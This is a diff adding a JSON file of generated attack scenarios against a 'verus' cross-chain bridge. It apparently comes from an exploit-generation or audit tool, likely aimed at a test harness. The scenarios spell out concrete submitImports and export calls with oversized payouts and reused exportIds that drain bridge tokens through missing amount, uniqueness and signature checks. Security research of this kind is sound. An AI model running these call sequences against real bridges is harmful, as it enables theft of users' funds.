@@ -1,0 +1,659 @@
+{
+  "bridge_name": "verus",
+  "scenarios": [
+    {
+      "scenario_id": "bridge_logic_bug_001",
+      "target_invariant": "asset_conservation_total_locked_equals_minted",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.97,
+      "retrieved_exploits": [
+        "meterio_20220205",
+        "metpassport_20220206",
+        "qubit_20220127"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "1000000000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Drain the bridge's pre‑minted destination tokens by claiming an unlimited payout for an already recorded exportId, violating the asset‑conservation invariant."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Drain the bridge's pre‑minted destination tokens by claiming an unlimited payout for an already recorded exportId, violating the asset‑conservation invariant."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_overclaim_001",
+      "target_invariant": "asset_conservation_refund_restores_balance",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.92,
+      "retrieved_exploits": [
+        "thorchain_20210629",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "1000000000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Claim an excessive payout for a known exportId; the bridge lacks a check that payout ≤ exported amount, allowing the attacker to drain the bridge's DstToken balance."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Claim an excessive payout for a known exportId; the bridge lacks a check that payout ≤ exported amount, allowing the attacker to drain the bridge's DstToken balance."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_logic_bug_drain",
+      "target_invariant": "asset_conservation_no_negative_source_balance",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.92,
+      "retrieved_exploits": [
+        "meterio_20220205",
+        "synapse_20211109"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "500000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "First unauthorized import using the previously recorded exportId, draining 500 tokens from the destination token pool."
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "500000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Second unauthorized import with the same exportId, exploiting the missing payout check to extract another 500 tokens."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "First unauthorized import using the previously recorded exportId, draining 500 tokens from the destination token pool."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Second unauthorized import with the same exportId, exploiting the missing payout check to extract another 500 tokens."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_logic_bug_001",
+      "target_invariant": "authorization_withdraw_only_by_notary",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "polynetwork_20210810",
+        "socket_20240116",
+        "crosscurve_20260131",
+        "qanxbridge_20220518",
+        "orbit_20240101"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "999500000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Attacker calls submitImports with a large payout for an already recorded export. No check ensures payout does not exceed the exported amount, allowing unauthorized token transfer from the bridge."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attacker calls submitImports with a large payout for an already recorded export. No check ensures payout does not exceed the exported amount, allowing unauthorized token transfer from the bridge."
+        }
+      ]
+    },
+    {
+      "scenario_id": "double_claim_without_amount_check",
+      "target_invariant": "authorization_lock_amount_must_be_positive",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.92,
+      "retrieved_exploits": [
+        "meterio_20220205",
+        "multichain_20220118",
+        "bnbbridge_20221007",
+        "chainswap_20210711",
+        "nomad_20220801"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "recipient": "attacker",
+            "amount": "10000000000000000000"
+          },
+          "description": "Lock 10 tokens on source chain by exporting to attacker."
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "10000000000000000000",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "First claim: receive 10 bridged tokens corresponding to the locked amount."
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "10000000000000000000",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "Second claim: exploit missing claim‑limit check to receive another 10 tokens, ending with 20 bridged tokens while only 10 were locked."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Lock 10 tokens on source chain by exporting to attacker."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "First claim: receive 10 bridged tokens corresponding to the locked amount."
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Second claim: exploit missing claim‑limit check to receive another 10 tokens, ending with 20 bridged tokens while only 10 were locked."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_missing_signature",
+      "target_invariant": "authorization_submit_imports_requires_notary_signature",
+      "vulnerability_class": "missing_signature_check",
+      "confidence": 0.97,
+      "retrieved_exploits": [
+        "chainswap_20210711",
+        "multichain_20220118"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "500000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Attacker re‑calls submitImports for an already‑recorded exportId without providing any notary signature. The contract lacks signature verification, allowing double‑claim and transferring additional DstToken to the attacker."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attacker re‑calls submitImports for an already‑recorded exportId without providing any notary signature. The contract lacks signature verification, allowing double‑claim and transferring additional DstToken to the attacker."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_double_withdraw",
+      "target_invariant": "uniqueness_export_processed_once",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "crosscurve_20260131",
+        "polynetwork_20210810",
+        "metpassport_20220206",
+        "orbit_20240101",
+        "thorchain_20210629"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "500000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "First withdrawal using the recorded exportId."
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "500000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Second withdrawal using the same exportId, violating the uniqueness invariant."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "First withdrawal using the recorded exportId."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Second withdrawal using the same exportId, violating the uniqueness invariant."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_uniqueness_double_claim",
+      "target_invariant": "uniqueness_import_processed_once",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.92,
+      "retrieved_exploits": [
+        "wormhole_20220202",
+        "metpassport_20220206",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "500000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "First claim of the same exportId, receiving tokens from the bridge."
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "500000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Second claim of the same exportId, exploiting missing uniqueness check."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "First claim of the same exportId, receiving tokens from the bridge."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Second claim of the same exportId, exploiting missing uniqueness check."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_nonce_reuse_attack",
+      "target_invariant": "uniqueness_export_nonce_monotonic",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "crosscurve_20260131",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "500000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "First claim using the exported exportId; bridge transfers 500e18 to attacker."
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "500000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Second claim reusing the same exportId (nonce) because bridge does not enforce monotonicity or payout limits, draining additional tokens."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "First claim using the exported exportId; bridge transfers 500e18 to attacker."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Second claim reusing the same exportId (nonce) because bridge does not enforce monotonicity or payout limits, draining additional tokens."
+        }
+      ]
+    },
+    {
+      "scenario_id": "duplicate_import_nonce_exploit",
+      "target_invariant": "uniqueness_import_nonce_unique",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.97,
+      "retrieved_exploits": [
+        "polynetwork_20210810",
+        "feg_bridge_20241229"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "500000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "First import using the same exportId; bridge transfers 500 tokens to attacker."
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "500000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Second import with the same exportId, violating uniqueness and extracting another 500 tokens."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "First import using the same exportId; bridge transfers 500 tokens to attacker."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Second import with the same exportId, violating uniqueness and extracting another 500 tokens."
+        }
+      ]
+    },
+    {
+      "scenario_id": "verusbridge_missing_proof_check",
+      "target_invariant": "authorization_mint_requires_valid_proof",
+      "vulnerability_class": "logic_bug_missing_proof_verification",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "bnbbridge_20221007"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "1000000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Attacker claims an oversized payout for an already committed export. checkCCEValues does not verify Merkle proof or amount limits, allowing arbitrary token transfer from the bridge."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attacker claims an oversized payout for an already committed export. checkCCEValues does not verify Merkle proof or amount limits, allowing arbitrary token transfer from the bridge."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_asset_conservation_break",
+      "target_invariant": "asset_conservation_total_supply_constant",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "qubit_20220127"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "600000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Drain DstToken from bridge by claiming more than the exported amount; bridge lacks check against committed export amount."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Drain DstToken from bridge by claiming more than the exported amount; bridge lacks check against committed export amount."
+        }
+      ]
+    },
+    {
+      "scenario_id": "duplicate_exportid_attack",
+      "target_invariant": "uniqueness_no_duplicate_export_id",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "crosscurve_20260131"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x1111111111111111111111111111111111111111111111111111111111111111",
+            "recipient": "attacker",
+            "amount": "50000000000000000000"
+          },
+          "description": "First export of 50e18 tokens with chosen exportId."
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x1111111111111111111111111111111111111111111111111111111111111111",
+            "recipient": "attacker",
+            "amount": "50000000000000000000"
+          },
+          "description": "Second export using the same exportId, causing duplicate recording."
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "500000000000000000000000",
+            "exportId": "0x1111111111111111111111111111111111111111111111111111111111111111"
+          },
+          "description": "Claim a large payout from the bridge for the duplicated exportId, draining DstToken."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "First export of 50e18 tokens with chosen exportId."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Second export using the same exportId, causing duplicate recording."
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Claim a large payout from the bridge for the duplicated exportId, draining DstToken."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_overclaim_attack",
+      "target_invariant": "authorization_lock_caller_must_be_token_holder",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.95,
+      "retrieved_exploits": [
+        "multichain_20220118",
+        "meterio_20220205",
+        "bnbbridge_20221007",
+        "chainswap_20210711",
+        "metpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "1000000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Claim a payout larger than the exported amount. The bridge only checks that the exportId exists, not that payout ≤ exported amount, allowing the attacker to receive excess DstToken without having locked the corresponding source tokens."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Claim a payout larger than the exported amount. The bridge only checks that the exportId exists, not that payout ≤ exported amount, allowing the attacker to receive excess DstToken without having locked the corresponding source tokens."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_logic_bug_exploit_001",
+      "target_invariant": "asset_conservation_locked_amount_matches_commitment",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "meterio_20220205",
+        "thorchain_20210716"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "600000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Call submitImports with a payout larger than the committed export amount. The bridge only checks that the exportId is known, not that payout <= committedExport, allowing the attacker to receive excess DstToken."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call submitImports with a payout larger than the committed export amount. The bridge only checks that the exportId is known, not that payout <= committedExport, allowing the attacker to receive excess DstToken."
+        }
+      ]
+    }
+  ]
+}
